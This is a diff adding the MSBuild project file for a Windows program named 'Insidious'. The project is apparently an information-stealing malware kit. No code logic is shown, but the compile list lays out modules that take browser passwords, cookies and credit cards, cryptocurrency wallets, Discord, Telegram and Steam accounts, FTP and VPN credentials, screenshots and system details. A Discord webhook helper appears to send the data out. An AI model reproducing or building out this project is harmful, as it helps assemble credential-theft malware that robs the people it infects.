@@ -1,0 +1,200 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{3B0E2D3D-3D66-42BB-8F9C-D6E188F359AE}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>youknowcaliber</RootNamespace>
+    <AssemblyName>Insidious</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+    <PublishUrl>publish\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>build\debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <GenerateSerializationAssemblies>Auto</GenerateSerializationAssemblies>
+    <Prefer32Bit>false</Prefer32Bit>
+    <LangVersion>7.1</LangVersion>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>build\release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+    <LangVersion>7.1</LangVersion>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject />
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Helpers\AES.cs" />
+    <Compile Include="Helpers\Filemanager.cs" />
+    <Compile Include="Resources\Discord\DiscordWebhook.cs" />
+    <Compile Include="Resources\DotNetZip\CRC32.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ComHelper.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\EncryptionAlgorithm.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\Events.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\Exceptions.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ExtractExistingFileAction.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\FileSelector.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\OffsetStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\Shared.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\WinZipAes.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipConstants.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipCrypto.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipDirEntry.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipEntry.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipEntry.Extract.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipEntry.Read.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipEntry.Write.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipEntrySource.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipErrorAction.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.AddUpdate.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.Check.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.Events.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.Extract.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.Read.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.Save.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.SaveSelfExtractor.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.Selector.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipFile.x-IEnumerable.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipInputStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipOutputStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zip\ZipSegmentedStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\Deflate.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\DeflateStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\GZipStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\Inflate.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\InfTree.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\ParallelDeflateOutputStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\Tree.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\Zlib.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\ZlibBaseStream.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\ZlibCodec.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\ZlibConstants.cs" />
+    <Compile Include="Resources\DotNetZip\Zlib\ZlibStream.cs" />
+    <Compile Include="Targets\Discord\Discord.cs" />
+    <Compile Include="Targets\FileZilla\FileZilla.cs" />
+    <Compile Include="Targets\Minecraft\VimeWorld.cs" />
+    <Compile Include="Targets\Telegram\Telegram.cs" />
+    <Compile Include="Targets\Информация\BSSID.cs" />
+    <Compile Include="Targets\Информация\Buffer.cs" />
+    <Compile Include="Helpers\Counter.cs" />
+    <Compile Include="Helpers\GenStrings.cs" />
+    <Compile Include="Helpers\Help.cs" />
+    <Compile Include="Targets\Информация\ProcessList.cs" />
+    <Compile Include="Targets\Информация\Screen.cs" />
+    <Compile Include="Targets\Информация\SystemInfo.cs" />
+    <Compile Include="Helpers\WinAPI.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Targets\Steam\Steam.cs" />
+    <Compile Include="Targets\VPN\NordVPN.cs" />
+    <Compile Include="Targets\VPN\OpenVPN.cs" />
+    <Compile Include="Targets\VPN\ProtonVPN.cs" />
+    <Compile Include="Targets\Браузеры\Helpers\Banking.cs" />
+    <Compile Include="Targets\Браузеры\Helpers\Common.cs" />
+    <Compile Include="Targets\Браузеры\Helpers\Decryptor.cs" />
+    <Compile Include="Targets\Браузеры\Helpers\Json.cs" />
+    <Compile Include="Targets\Браузеры\Helpers\Paths.cs" />
+    <Compile Include="Targets\Браузеры\Helpers\Profile.cs" />
+    <Compile Include="Targets\Браузеры\Helpers\SQLite.cs" />
+    <Compile Include="Targets\Браузеры\Helpers\SqlReader.cs" />
+    <Compile Include="Targets\Браузеры\Helpers\Utils.cs" />
+    <Compile Include="Targets\Браузеры\Stealer.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\BrowserUtils.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Chromium\AesGcm.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Chromium\AutoFill.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Chromium\BCrypt.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Chromium\Bookmarks.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Chromium\Chromium.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Chromium\Cookies.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Chromium\CreditCards.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Chromium\Downloads.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Chromium\History.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Chromium\Passwords.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Edge\AutoFill.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Edge\Bookmarks.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Edge\CreditCards.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Edge\Edge.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Firefox\Bookmarks.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Firefox\Cookies.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Firefox\FireFox.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Firefox\History.cs" />
+    <Compile Include="Targets\Браузеры\Targets\Browsers\Firefox\Passwords.cs" />
+    <Compile Include="Targets\Браузеры\URLSearcher.cs" />
+    <Compile Include="Targets\Крипта\Armory.cs" />
+    <Compile Include="Targets\Крипта\AtomicWallet.cs" />
+    <Compile Include="Targets\Крипта\BitcoinCore.cs" />
+    <Compile Include="Targets\Крипта\Bytecoin.cs" />
+    <Compile Include="Targets\Крипта\DashCore.cs" />
+    <Compile Include="Targets\Крипта\Electrum.cs" />
+    <Compile Include="Targets\Крипта\Ethereum.cs" />
+    <Compile Include="Targets\Крипта\Exodus.cs" />
+    <Compile Include="Targets\Крипта\Jaxx.cs" />
+    <Compile Include="Targets\Крипта\LitecoinCore.cs" />
+    <Compile Include="Targets\Крипта\Monero.cs" />
+    <Compile Include="Targets\Крипта\%40StartWallets.cs" />
+    <Compile Include="Targets\Крипта\Zcash.cs" />
+    <Compile Include="Targets\Файлы\Files.cs" />
+    <Compile Include="Targets\Файлы\Folders.cs" />
+    <Compile Include="Targets\Файлы\IFolders.cs" />
+    <Compile Include="Config.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+  </ItemGroup>
+  <ItemGroup />
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
